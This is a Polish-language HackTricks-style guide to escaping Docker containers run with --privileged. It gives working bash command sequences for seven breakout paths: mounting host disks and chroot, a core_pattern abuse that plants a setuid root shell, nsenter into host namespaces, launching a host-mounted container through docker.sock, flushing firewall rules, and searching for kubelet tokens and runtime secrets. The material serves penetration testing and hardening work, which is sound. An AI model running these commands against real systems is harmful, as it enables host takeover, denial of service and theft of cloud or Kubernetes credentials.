# Ucieczka z kontenerów `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Kontener uruchomiony z `--privileged` nie jest tym samym co zwykły kontener z jednym lub dwoma dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych zabezpieczeń runtime, które zwykle chronią workload przed niebezpiecznymi zasobami hosta. Dokładny efekt nadal zależy od runtime i hosta, ale w przypadku Dockera typowym rezultatem jest:

- przyznanie wszystkich capabilities
- zniesienie ograniczeń cgroup urządzeń
- zaprzestanie montowania wielu systemów plików kernela w trybie tylko do odczytu
- usunięcie domyślnie zamaskowanych ścieżek procfs
- wyłączenie filtrowania seccomp
- wyłączenie izolacji AppArmor
- wyłączenie izolacji SELinux lub zastąpienie jej znacznie szerszą etykietą

Ważną konsekwencją jest to, że uprzywilejowany kontener zwykle **nie** potrzebuje subtelnego exploita kernela. W wielu przypadkach może po prostu bezpośrednio uzyskać dostęp do urządzeń hosta, systemów plików kernela dostępnych z poziomu hosta lub interfejsów runtime, a następnie wykonać pivot do shella hosta.

## Czego `--privileged` Nie Zmienia Automatycznie

`--privileged` **nie** dołącza automatycznie do przestrzeni nazw PID, sieci, IPC ani UTS hosta. Uprzywilejowany kontener nadal może mieć prywatne przestrzenie nazw. Oznacza to, że niektóre chainy escape wymagają dodatkowego warunku, takiego jak:

- bind mount hosta
- współdzielenie PID hosta
- sieć hosta
- widoczne urządzenia hosta
- zapisywalne interfejsy proc/sys

Warunki te są często łatwe do spełnienia w rzeczywistych błędnych konfiguracjach, ale koncepcyjnie są odrębne od samego `--privileged`.

## Ścieżki Ucieczki

### 1. Zamontowanie Dysku Hosta Za Pośrednictwem Udostępnionych Urządzeń

Uprzywilejowany kontener zwykle widzi znacznie więcej węzłów urządzeń w `/dev`. Jeśli urządzenie blokowe hosta jest widoczne, najprostszą metodą ucieczki jest zamontowanie go i wykonanie `chroot` do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Jeśli partycja root nie jest oczywista, najpierw wylicz układ bloków:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Jeśli praktycznym rozwiązaniem jest umieszczenie helpera setuid w zapisywalnym montowaniu hosta zamiast użycia `chroot`, pamiętaj, że nie każdy system plików respektuje bit setuid. Szybkie sprawdzenie możliwości po stronie hosta wygląda następująco:
```bash
mount | grep -v "nosuid"
```
Jest to przydatne, ponieważ zapisywalne ścieżki w systemach plików `nosuid` są znacznie mniej interesujące w przypadku klasycznych scenariuszy typu „umieść powłokę setuid i uruchom ją później”.

Osłabione zabezpieczenia wykorzystywane w tym przypadku to:

- pełna ekspozycja urządzeń
- szeroki zakres capabilities, zwłaszcza `CAP_SYS_ADMIN`

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Zamontowanie lub ponowne użycie host bind mount i `chroot`

Jeśli główny system plików hosta jest już zamontowany wewnątrz kontenera albo kontener może utworzyć wymagane mounty, ponieważ jest uprzywilejowany, uzyskanie powłoki hosta często wymaga tylko jednego `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli nie istnieje bind mount do katalogu root hosta, ale pamięć masowa hosta jest dostępna, utwórz go:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ta ścieżka wykorzystuje:

- osłabione ograniczenia montowania
- pełne capabilities
- brak confinementu MAC

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Wykorzystanie zapisywalnego `/proc/sys` lub `/sys`

Jedną z głównych konsekwencji `--privileged` jest znaczne osłabienie ochrony procfs i sysfs. Może to ujawnić interfejsy kernela przeznaczone dla hosta, które normalnie są maskowane lub montowane tylko do odczytu.

Klasycznym przykładem jest `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Inne wartościowe ścieżki obejmują:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ta ścieżka wykorzystuje:

- brak zamaskowanych ścieżek
- brak ścieżek systemowych tylko do odczytu

Powiązane strony:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Użycie pełnych capabilities do ucieczki opartej na mount lub namespace

Uprzywilejowany kontener otrzymuje capabilities, które są zwykle usuwane ze standardowych kontenerów, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` i wiele innych. Często wystarcza to, aby przekształcić lokalny foothold w ucieczkę na hosta, gdy tylko istnieje inna exposed surface.

Prostym przykładem jest zamontowanie dodatkowych filesystemów i użycie wejścia do namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Jeśli współdzielony jest również PID hosta, krok staje się jeszcze krótszy:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ta ścieżka wykorzystuje:

- domyślny zestaw uprzywilejowanych capabilities
- opcjonalne współdzielenie PID hosta

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ucieczka przez sockety runtime

Uprzywilejowany kontener często uzyskuje dostęp do stanu runtime hosta lub widocznych socketów. Jeśli socket Docker, containerd lub CRI-O jest osiągalny, najprostszym podejściem jest często użycie API runtime do uruchomienia drugiego kontenera z dostępem do hosta:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dla containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ta ścieżka wykorzystuje:

- uprzywilejowany dostęp do runtime
- bind mounty hosta tworzone bezpośrednio przez runtime

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Usuń skutki uboczne izolacji sieciowej

`--privileged` samo w sobie nie dołącza do network namespace hosta, ale jeśli kontener ma również `--network=host` lub inny dostęp do sieci hosta, cały stos sieciowy staje się modyfikowalny:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Nie zawsze prowadzi to bezpośrednio do uzyskania host shell, ale może skutkować odmową usługi, przechwyceniem ruchu lub dostępem do usług zarządzania dostępnych wyłącznie przez loopback.

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Odczytywanie sekretów hosta i stanu runtime

Nawet gdy natychmiastowe uzyskanie dostępu przez shell nie jest możliwe, uprzywilejowane kontenery często mają wystarczający dostęp, aby odczytywać sekrety hosta, stan kubelet, metadane runtime oraz systemy plików sąsiednich kontenerów:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Jeśli `/var` jest zamontowane z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement albo kradzieży poświadczeń cloud/Kubernetes, nawet zanim uzyskany zostanie shell hosta.

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

Celem poniższych poleceń jest potwierdzenie, które rodziny metod ucieczki z privileged container są natychmiast wykonalne.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Co jest tu interesujące:

- pełny zestaw capabilities, zwłaszcza `CAP_SYS_ADMIN`
- dostęp do zapisu w proc/sys
- widoczne urządzenia hosta
- brak seccomp i ograniczeń MAC
- sockety runtime lub bind mounty głównego katalogu hosta

Każdy z tych elementów może wystarczyć do post-exploitation. Kilka z nich razem zwykle oznacza, że kontener dzieli od przejęcia hosta funkcjonalnie jedna lub dwie komendy.

## Powiązane strony

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Referencje

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
